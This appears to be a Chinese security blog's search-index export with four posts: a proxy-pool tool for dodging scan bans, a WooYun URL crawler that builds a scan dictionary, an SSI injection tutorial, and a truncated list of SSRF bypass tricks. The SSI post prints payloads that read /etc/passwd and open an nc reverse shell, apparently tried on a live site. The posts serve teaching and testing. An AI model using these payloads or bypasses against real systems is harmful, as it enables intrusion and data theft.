<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PrxoyPool-免费代理池的设计与实现]]></title>
    <url>%2F2018%2F04%2F27%2FPrxoyPool-%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言在进行渗透测试、漏洞挖掘的时候，使用自动化工具是必须的一步，但是令人😠的是，经常由于扫描等原因导致IP被ban，这是我们最不想看到的。所以本着学习编程的目的，根据网上搜索的资料，东拼西凑的开发了这个系统。 0x01 涉及技术 Python3 使用Python3的原因是由于异步IO使用的是asyncio和aiohttp，所以就学习尝试了下Python3，其实没多大区别感觉。（刚开始学编程，原谅我啥都不知道😜） Flask 使用Flask作为Web开发微框架，交与其他Python框架，具有简便、易扩展等优点。具体可看：Flask中文文档 Redis Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。 五种类型数据类型为：字符串、列表、集合、有序集合、散列表。本次数据存储方面就利用的redis的有序集合。 爬虫 爬虫部分是从11个免费代理网站上抓取免费、高可用性的代理IP，并进行数据处理获取统一格式。同时本着学习的理念使用了：lxml，pyquery，正则，json等不同的技术来实现。 异步IO 默认给代理池设置的阈值为50000，由于数量比较大，为了提高代理高可用性的检测效率，我们在这里使用异步请求库aiohttp来进行检测。具体参考：廖雪峰的官方网站-异步IO 前端 web前端部分我是真不懂（但是我会抄啊😝），直接wget的一个自己觉得比较简洁的网站的前端，哈哈😄～ ​ 0x02 架构部分 主要分为如下几个模块： 爬虫模块： 主要从11个免费代理网站上抓取免费的代理IP，并进行格式统一处理。同时为了保证代理池的枯竭，采用周期性抓取。 1234567891011www.66ip.cnwww.xdaili.cnwww.kuaidailiwww.ip3366.netwww.89ip.cnwww.xicidaili.comwww.iphai.compremproxy.comwww.xroxy.comwww.data5u.comwww.kxdaili.com 存储模块 主要学习了GitHub上一个采用的redis的有序集合来进行的，一是保证代理数据的不重复，二是使用zscore来标记代理的可用性。 检测模块 定时检测数据库中的代理的可用性情况，并采用打分机制，初始化一个分值，若可用则标记为最高，不可用则在初始化分值基础上减1，直到为0，则从redis中删除。后续random获取的时候采用分值最高的优先展示的从高到低模式。同时保证代理的实时可用性，设置定时检测。 API模块 采用Flask作为web服务器，前端copy的别人的改的。从redis数据库中优先选择出分数最高的，若同时存在多个，则随机选择一个。 ​ 0x03 具体实现爬虫模块1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071def crawl_daili66(self, page_count=4): &quot;&quot;&quot; 获取代理:www.66ip.cn 方法:pyquery &quot;&quot;&quot; start_url = &apos;http://www.66ip.cn/&#123;&#125;.html&apos; urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: html = get_page(url) if html: doc = pq(html) trs = doc(&apos;.containerbox table tr:gt(0)&apos;).items() for tr in trs: ip = tr.find(&apos;td:nth-child(1)&apos;).text() port = tr.find(&apos;td:nth-child(2)&apos;).text() yield &apos;:&apos;.join([ip, port])def crawl_ip181(self, page_count=2): &quot;&quot;&quot; 获取代理:www.xdaili.cn 方法:json &quot;&quot;&quot; start_url = &apos;http://www.xdaili.cn/ipagent//freeip/getFreeIps?page=&#123;&#125;&apos; urls = [start_url.format(page) for page in range(1, page_count + 1)] for url in urls: try: response = requests.get(url) print(&apos;抓取成功 &gt;&gt;&gt; &apos;, url, response.status_code) if response.status_code == 200: html = response.json() except ConnectionError: print(&apos;抓取失败 &gt;&gt;&gt; &apos;, url) pass if html: # ip_address = re.compile(r&apos;&quot;ip&quot;:&quot;(.*?)&quot;,&quot;port&quot;:&quot;(.*?)&quot;&apos;) # ip_address = ip_address.findall(html) for key in html[&apos;RESULT&apos;][&apos;rows&apos;]: yield &apos;:&apos;.join([key[&apos;ip&apos;], key[&apos;port&apos;]])def crawl_kuaidaili(self): &quot;&quot;&quot; 获取代理:www.kuaidaili 方法:xpath &quot;&quot;&quot; for i in range(1, 4): start_url = &apos;http://www.kuaidaili.com/free/inha/&#123;&#125;/&apos;.format(i) html = get_page(start_url) if html: html = etree.HTML(html, parser=etree.HTMLParser(encoding=&apos;utf-8&apos;)) _ip_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[1]/text()&apos; _port_xpath = &apos;//*[@id=&quot;list&quot;]/table/tbody/tr[&#123;&#125;]/td[2]/text()&apos; for i in range(1, 16): ip_xpath = _ip_xpath.format(i) port_xpath = _port_xpath.format(i) ip = html.xpath(ip_xpath)[0] port = html.xpath(port_xpath)[0] yield &quot;:&quot;.join([ip, port])def crawl_ip3366(self): &quot;&quot;&quot; 获取代理:www.ip3366.net 方法:正则 &quot;&quot;&quot; for page in range(1, 4): start_url = &apos;http://www.ip3366.net/free/?stype=1&amp;page=&#123;&#125;&apos;.format(page) html = get_page(start_url) ip_address = re.compile(&apos;&lt;tr&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;\s*&lt;td&gt;(.*?)&lt;/td&gt;&apos;) re_ip_address = ip_address.findall(html) for address, port in re_ip_address: result = address + &apos;:&apos; + port yield result.replace(&apos; &apos;, &apos;&apos;) 本着学习的目的，同时采用了pyquery，正则，json，xpath等不同的获取方法，使用yield来将这些方法定义成生成器，这样我们每次请求就会通过yield来返回一个代理IP。 同时使用crawl_开头的函数命名方法，来达到动态添加代理网站地址接口的目的（这部分借鉴的大神的），具体参考：python元类解析 12345678910111213141516171819class ProxyMetaclass(type): def __new__(cls, name, bases, attrs): count = 0 attrs[&apos;__CrawlFunc__&apos;] = [] for k, v in attrs.items(): if &apos;crawl_&apos; in k: attrs[&apos;__CrawlFunc__&apos;].append(k) count += 1 attrs[&apos;__CrawlFuncCount__&apos;] = count return type.__new__(cls, name, bases, attrs)class Crawler(object, metaclass=ProxyMetaclass): def get_proxies(self, callback): proxies = [] for proxy in eval(&quot;self.&#123;&#125;()&quot;.format(callback)): print(u&apos;成功获取到代理 &gt;&gt;&gt; &apos;, proxy) proxies.append(proxy) return proxies 定义类ProxyMetaclass并声明一个__new__方法，同时Crawler类将它声明为元类，这个方法有固定的几个参数cls, name, bases, attrs，第四个参数attrs中包含了类的一些属性。我们可以遍历attrs这个参数即可获取类的所有方法信息，就像遍历字典一样，键名对应方法的名称。然后判断方法的开头是否crawl_，如果是，则将其加入到__CrawlFunc__属性中。这样我们就成功将所有以crawl_开头的方法定义成了一个属性，动态获取到所有以crawl_开头的方法列表。 然后定义了一个get_proxies()方法，将所有以crawl_开头的方法调用一遍，获取每个方法返回的代理并组合成列表形式返回。 存储模块采用redis的有序集合，集合的特点是集合的每一个元素都是不重复的，这样就保证了代理的不重复。有序集合，顾名思义，这里存储的数据是有序的，我们就可以利用这点对代理IP进行打分、排序，实现权重的效果。具体可参考：Redis 有序集合(sorted set) 连接redis 1db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=True) 添加数据，添加代理，设置分数为最高 123456def add(self, proxy, score=INITIAL_SCORE): if not re.match(&apos;\d+\.\d+\.\d+\.\d+\:\d+&apos;, proxy): print(&apos;代理不符合规范&apos;, proxy, u&apos;丢弃&apos;) return if not self.db.zscore(REDIS_KEY, proxy): return self.db.zadd(REDIS_KEY, score, proxy) 获取代理IP，随机获取有效代理，首先尝试获取最高分数代理，如果不存在，按照排名获取，否则异常 1234567891011def random(self): result = self.db.zrangebyscore(REDIS_KEY, MAX_SCORE, MAX_SCORE) if len(result): return choice(result) else: result = self.db.zrevrange(REDIS_KEY, 0, 100) if len(result): return choice(result) else: raise PoolEmptyError 删除代理IP，代理值减一分，小于最小值则删除 123456789def decrease(self, proxy): score = self.db.zscore(REDIS_KEY, proxy) if score and score &gt; MIN_SCORE: print(&apos;代理&apos;, proxy, u&apos;当前分数&apos;, score, u&apos;减1&apos;) return self.db.zincrby(REDIS_KEY, proxy, -1) else: print(&apos;代理&apos;, proxy, u&apos;当前分数&apos;, score, &apos;移除&apos;) return self.db.zrem(REDIS_KEY, proxy) 检测模块代理检测第一次可用，则分数设置为100，代理不可用，分数减1，这样就可以实时改变每个代理的可用情况。API接口返回的时候只需要获取分数高的代理即可。使用的python3的异步IO库aiohttp，参考的大神的表演，学习了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Tester(object): def __init__(self): self.redis = RedisClient() async def test_single_proxy(self, proxy): &quot;&quot;&quot; 异步测试单个代理IP并写入redis &quot;&quot;&quot; conn = aiohttp.TCPConnector(verify_ssl=False) async with aiohttp.ClientSession(connector=conn) as session: try: if isinstance(proxy, bytes): proxy = proxy.decode(&apos;utf-8&apos;) real_proxy = &apos;http://&apos; + proxy print(&apos;正在测试 &gt;&gt;&gt;&apos;, proxy) async with session.get(TEST_URL, proxy=real_proxy, timeout=15, allow_redirects=False) as response: if response.status in VALID_STATUS_CODES: self.redis.max(proxy) print(&apos;代理可用 &gt;&gt;&gt; &apos;, proxy) else: self.redis.decrease(proxy) print(&apos;请求响应码不合法 &gt;&gt;&gt;&apos;, response.status, &apos;IP&apos;, proxy) except Exception as e: self.redis.decrease(proxy) print(&apos;代理请求失败 &gt;&gt;&gt; &apos;, proxy) def run(self): &quot;&quot;&quot; 测试主函数 &quot;&quot;&quot; print(&apos;*** 测试器开始运行 ***&apos;) try: count = self.redis.count() print(&apos;当前剩余：&apos;, count, u&apos;个代理&apos;) for i in range(0, count, BATCH_TEST_SIZE): start = i stop = min(i + BATCH_TEST_SIZE, count) print(&apos;正在测试第&apos;, start + 1, &apos;-&apos;, stop, u&apos;个代理&apos;) test_proxies = self.redis.batch(start, stop) loop = asyncio.get_event_loop() tasks = [self.test_single_proxy(proxy) for proxy in test_proxies] loop.run_until_complete(asyncio.wait(tasks)) sys.stdout.flush() time.sleep(5) except Exception as e: print(&apos;测试器发生错误&apos;, e.args) 定义了一个类Tester，接下来定义了一个test_single_proxy()方法，并在前面加了async关键词，这代表这个方法是异步的。方法内部首先创建了aiohttp的ClientSession对象，此对象类似于requests的Session对象，可以直接调用该对象的get()方法来访问页面。在这里，代理的设置是通过proxy参数传递给get()方法，程序在获取Response后需要判断响应的状态，如果状态码在VALID_STATUS_CODES列表里，则代表代理可用，可以调用RedisClient的max()方法将代理分数设为100，否则调用decrease()方法将代理分数减1，如果出现异常也同样将代理分数减1。 0x04 接口模块使用Flask实现接口模块，前端wget的VulApps的前端模版。 1234567891011121314151617181920212223242526272829303132333435__all__ = [&apos;app&apos;]app = Flask(__name__)def get_conn(): if not hasattr(g, &apos;redis&apos;): g.redis = RedisClient() return g.redis@app.route(&apos;/&apos;)def index(): render = render_template(&apos;index.html&apos;) return make_response(render)@app.route(&apos;/random&apos;)def get_proxy(): &quot;&quot;&quot; 获取proxyAPI :return: 随机代理 &quot;&quot;&quot; conn = get_conn() return conn.random()@app.route(&apos;/count&apos;)def get_counts(): &quot;&quot;&quot; Get the count of proxies :return: 代理池总量 &quot;&quot;&quot; conn = get_conn() return str(conn.count())if __name__ == &apos;__main__&apos;: app.run() 前端模版index.html 项目地址：http://proxy.w2n1ck.com:9090/ API接口：http://proxy.w2n1ck.com:9090/random 0x05 使用测试结果如下： 获取代理IP： 123456789import requestsPROXY_POOL_URL = &apos;http://proxy.w2n1ck.com:9090/random&apos;def get_proxy(): try: response = requests.get(PROXY_POOL_URL) if response.status_code == 200: return response.text except ConnectionError: return None 使用代理IP： 1234567891011import requestsproxy = get_proxy()proxies = &#123; &apos;http&apos;: &apos;http://&apos; + proxy, &apos;https&apos;: &apos;https://&apos; + proxy,&#125;try: response = requests.get(&apos;http://ip.cn/&apos;, proxies=proxies) print(response.text)except: pass]]></content>
      <tags>
        <tag>Python,Redis,代理,渗透测试,自动化,爬虫,Flask</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[伏特漏洞扫描-IoT设备安全解决方案]]></title>
    <url>%2F2018%2F04%2F23%2F%E4%BC%8F%E7%89%B9%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-IoT%E8%AE%BE%E5%A4%87%E5%AE%89%E5%85%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[# 前言随着智能硬件的兴起，大量智能家居和可穿戴设备进入了人们的生活，根据Gartner 报告预测，2020年全球IOT物联网设备数量将高达260亿个。但是由于安全标准滞后，以及智能设备制造商缺乏安全意识和投入，物联网已经埋下极大隐患，是个人隐私、企业信息安全甚至国家关键基础设施的头号安全威胁。试想一下，无论家用或企业级的互连设备，如接入互联网的交通指示灯，恒温器，或医用监控设备遭到攻击，后果都将非常可怕。 # 0x01 物联网安全需求物联网根据业务形态主要分为工业控制物联网、车载物联网、智能家居物联网。不同的业务形态对安全的需求不尽相同。 由于其他原因，具体细节暂时不公布。请后续留意关注！]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>扫描器</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wooyun漏洞地址url爬虫及数据处理]]></title>
    <url>%2F2018%2F03%2F28%2FWooyun%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80url%E7%88%AC%E8%99%AB%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[之前做测试的时候，发现@四爷发现个漏洞，一个非常古怪的地址，我问四爷：“你咋知道这个的？”，四爷说：“扫的啊！”，我：“。。。”，所以才有了这篇文章。 PS：以上故事纯属扯淡 ! 0.0 其实是今年给自己定了个目标，就是好好把编程给学好，毕竟自己安全那么菜，说不定就失业了。。。 0x00 获取Wooyun漏洞地址这里选择爬取的目标是https://wooyun.shuimugan.com，这个镜像站有个好处，就是它的wooyun漏洞地址存入数据库的时候使用了id，即https://wooyun.shuimugan.com/bug/view?bug_no=1这种形式，所以，我们只需要遍历bug_no即可获取所有的漏洞地址（这里考虑到数据下载、处理、文件io等因素，选择了先把存在漏洞的url先存起来）。 感谢网站的站长的不杀之恩！因为，在进行获取地址的时候由于一直再调试并发引擎，所以爬了好多遍。。。 在获取存在漏洞URL的时候只使用了协程，然后主程序使用的进程，数据下载部分使用的进程+协程。 在使用requests请求的时候虽然一直用verif=False来忽略ssl，但是会一直打印： 12/Library/Python/2.7/site-packages/requests/packages/urllib3/connectionpool.py:768: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.htmlInsecureRequestWarning) 搞的很不爽，百度了下使用了下面代码解决： 1234567import ssltry: _create_unverified_https_context = ssl._create_unverified_context # 忽略证书错误except AttributeError: passelse: ssl._create_default_https_context = _create_unverified_https_context 请求的时候使用了通用的反爬虫策略： 伪装header头 随机User-Aagent 随机IP 这里本来是打算使用自己的代理池的，无奈免费的代理实在是慢，浪费时间，同时可能导致数据不准确。所以就没有使用代理IP了。 1234567headers = &#123;&quot;User-Agent&quot;: random.choice(User-Agent),&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125; 协程部分： 12345678910from gevent import monkey, poolmonkey.patch_all()reload(sys)sys.setdefaultencoding(&apos;utf8&apos;)p = pool.Pool(150)for i in range(NUM): _url = url + str(i) jobs.append(p.spawn(getURL, _url))gevent.joinall(jobs) 网站bug_no总共有230305个，获取到了8万多个存在漏洞的地址。 0x01 下载数据下载数据是爬虫的重点，本着只多不少的原则，本来考虑到大的数据量，效率问题，使用正则表达式来进行处理，但是发现获取的脏数据太多，对后面的数据处理造成了很多无法预知的麻烦，所以最终选择的方案是使用xpath+re来进行数据处理。 首先，使用xpath获取漏洞细节部分（有些url在poc字段，但是考虑到大部分，所以只选择了漏洞细节字段，所以爬取的结果不是很准确。） xpath：//*[@id=&quot;w0&quot;]/tbody/tr[21]/td/text() 这里遇到个问题就是无论怎么复制，都无法获取到漏洞细节里面的内容，使用chrome的xpath helper也的确是能匹配到内容，实在是郁闷！最终在我@加菲猫和@nearg1e斌哥哥的帮助下找到了原因。 原因在于：chrome浏览器在进行页面渲染时使用了htmlparse进行了处理，所以诸如tbody等一些标签是chrome自动加载的。 最终的xpath：//*[@id=&quot;w0&quot;]/tr[21]/td//text() 下面就是从漏洞细节中获取所有的URL了，这里还是为了更多的获取URL，找了个非常全面的正则表达式： 1r = re.compile(r&apos;(?i)\b((?:[a-z][\w-]+:(?:/&#123;1,3&#125;|[a-z0-9%])|www\d&#123;0,3&#125;[.]|[a-z0-9.\-]+[.][a-z]&#123;2,4&#125;/)(?:[^\s()&lt;&gt;]+|\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\))+(?:\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\)|[^\s\`!()\[\]&#123;&#125;;:\&apos;&quot;.,&lt;&gt;?«»“”‘’]))&apos;) 导致匹配的URL什么奇葩都有，具体可看：dicc.txt的内容 在使用这个re的时候又遇到个问题，程序跑着跑着停了，很是无语，后来经帮助调试发现是有些sql注入的URL中存在(,)这两个字符，导致正则死掉，为了图方便，直接做了个判断给剔除了 -。- 并发部分参考如下代码：123456789101112131415161718192021222324252627...def create_process(level, jobqueue, plugins, debug, headers): for _ in range(level): process = multiprocessing.Process(target=worker, args=(jobqueue, plugins, debug, headers)) process.daemon = True process.start()def worker(jobqueue, plugins, debug, headers): while True: try: target = jobqueue.get() gevent_scan_task(target, plugins, debug, headers) except Exception, e: print traceback.format_exc() finally: jobqueue.task_done()def gevent_scan_task(target, plugins, debug, headers): evt = Event() pool = [] scanmodle = ScanModle(target, plugins, debug, headers) pool.append(gevent.spawn(scanmodle.scan_port(evt))) pool.append(gevent.spawn(scanmodle.scan_plugins(evt))) for port in scanmodle.get_ports(): pool.append(gevent.spawn(scanmodle.scan_plugins(evt, port))) gevent.joinall(pool) save_cache(scanmodle) 最终获取到了153217个地址 0x02 数据处理这部分说难也难说不难也不难，我是不太在行【捂脸】，目前我处理的步骤如下： 去除所有中文部分（这里由于有些url中的确是带中文，所有使用换行替换） 去除所有只有/，.及len(strip(link) == 0的部分 获取所有URL中的目录部分(使用urlparse) 去除一些其他比如wooyun/bugs，jdbc，**，xmlns，t.cn，ldap，ssh等非预期字符及长度小于等于4的部分 使用urlparse获取p.path, p.query,p.fragment,并使用isinstance来判断两个URL是否相同来去重 说明： 1、第三步没有使用迭代，比如： 12345678/wooyun/bugs/?id=1没有获取：?id=1/wooyun/wooyun/bugs/只是获取到：/wooyun/bugs/?id=1有兴趣可参考：https://github.com/Xyntax/POC-T/blob/2.0/plugin/urlparser.py 代码如下： 123456789101112131415import urlparseimport sysreload(sys)sys.setdefaultencoding(&apos;utf-8&apos;)def iterate_path(ori_str):# parser = urlparse.urlparse(ori_str)# _path_list = parser.path.replace(&apos;//&apos;, &apos;/&apos;).strip(&apos;/&apos;).split(&apos;/&apos;)# print _path_list _ans_list = set() _ans_list.add(ori_str) _ans_list = list(_ans_list) for i in range(len(_ans_list)): p = urlparse.urlparse(_ans_list[i]) return urlparse.urlunsplit([&apos;&apos;, &apos;&apos;, p.path, p.query, p.fragment]) 2、第五步是简单去除如下类型的URL： 1234567/wooyun/?id=1&amp;url=123/wooyun/?id=2&amp;url=233/wooyun/?id=3&amp;url=666和/wooyun/1.html/wooyun/233.html/wooyun/6666.html 0x03 后续其实我主要是想获取个扫描目录的字典，但是如果发散下呢？这些URL有什么用？ 我思考的如下： 1、在我刚算入门安全的时候wooyun叽叽了，所以有些漏洞自己基本上没见过，要是在一个一个去看文章，那代价太大了也没有时间。使用这个做目录扫描的时候，如果发现存在此URL，那么说明在wooyun上是存在这个漏洞的，如果自己不知道就可以搜一波，学习下了，快捷、高效。 2、做agent、入侵防御、态势感知的话，可把这些做成漏洞库，遇到访问这些地址就可以来个告警，也可以当个威胁情报搞搞。 3、做个漏洞分析，看看大佬们都喜欢提交啥漏洞（我不会告诉你排在第一二的是svn和git） 获取的数据，处理和没处理的都可以在下面地址下载（PS：处理真的只是简单处理，比如大佬们上传的webshell、一些只针对某个网站的URL筛选等都得做，，，慎用！后续还得优化，大佬们有兴趣的话带带我。 0.0） 未处理：dicc.txt 已处理：dicc8.txt]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>漏洞挖掘</tag>
        <tag>Wooyun</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSI-服务器端包含注入]]></title>
    <url>%2F2018%2F01%2F05%2FSSI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前段时间刚好在一篇文章中看到了一个SSI的文章，现在这种业务基本上很少见了，之前也没了解过(原谅我是菜鸡—_-!)没留意过。运气好，刚好在微博上给遇到了，所以记录下学习过程。 0x01 关于SSISSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 1.1 启用SSI示例：Nginx 配置SSI功能 在http段中加入下面几句即可：123ssi on;ssi_silent_errors off;ssi_types text/shtml; 默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。 IIS和Apache都可以开启SSI功能，具体可参考:http://m.jb51.net/article/25725.htm 1.2 SSI语法首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。1234567891011121314151617181920212223242526272829303132333435361、显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址&lt;/ins&gt;&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;2、将文本内容直接插入到文档中&lt;#include&gt;&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径3、显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt;4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)6、高级SSI可设置变量使用if条件语句。 更多请参考：http://www.javaeye.com/topic/306216 0x02 漏洞场景在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。 从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：1234文件相关的属性字段当前时间访客IP调用CGI程序 0x03 SSI注入的条件当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令： Web 服务器已支持SSI（服务器端包含） Web 应用程序未对对相关SSI关键字做过滤 Web 应用程序在返回响应的HTML页面时，嵌入用户输入 SSI注入常用命令： https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection 0x04 SSI挖掘思路两个思路： 从业务场景来Fuzz，比如获取IP、定位、时间等 识别页面是否包含.stm,.shtm和.shtml后缀 google dork：inurl:bin/cklb 0x05 SSI漏洞复现5.1 本地测试我们使用bWAPP来做漏洞演示环境选择：Server-Side Includes (SSI) Injection输入个XSS的payload：&lt;script&gt;alert(1)&lt;/script&gt;成功执行了代码。 再使用下exec指令使用cmd作为参数执行服务器端命令：&lt;!--#exec cmd=&quot;ls -al&quot;--&gt; 5.2 漏洞挖掘运气好，刚好遇到个微博的。1&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; 1&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt; 0x06 SSI防御 关闭服务器SSI功能 过滤相关SSI特殊字符（&lt;,&gt;,#,-,&quot;,&#39;） 具体请参考：SSI 注入的介绍和代码防御 参考：http://m.jb51.net/article/25725.htm http://www.kubiji.cn/topic-id998.html https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection http://www.mottoin.com/101526.html http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/ http://blog.csdn.net/qq_29277155/article/details/52751364]]></content>
      <tags>
        <tag>自动化</tag>
        <tag>命令执行</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF绕过方法总结]]></title>
    <url>%2F2017%2F11%2F21%2FSSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言 昨天忘了在公众号还是微博上看到的了，看到一个SSRF绕过的技巧，使用的是ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ绕过的，自己也没遇到过。然后想想自己对SSRF绕过还是停留在之前的了解，也没学习过新的绕过方法，所以特意找了找资料，学习学习最新黑科技，充充能。 0x00 SSRF是什么能精简的就不扯淡，一句话就是：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。 0x01 SSRF能干什么 探测内网信息 攻击内网或本地其他服务 穿透防火墙 。。。 0x02 SSRF怎么找 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具 。。。 举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。 以上这些不是本文的重点，下面说下重点介绍的SSRF绕过的方法。 0x03 SSRF怎么绕1、攻击本地12http://127.0.0.1:80http://localhost:22 2、利用[::]123利用[::]绕过localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@1http://example.com@127.0.0.1 4、利用短地址1http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析1http://127.0.0.1.xip.io/ 1http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析1在域名上设置A记录，指向127.0.1 7、利用上传1234也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics1234利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 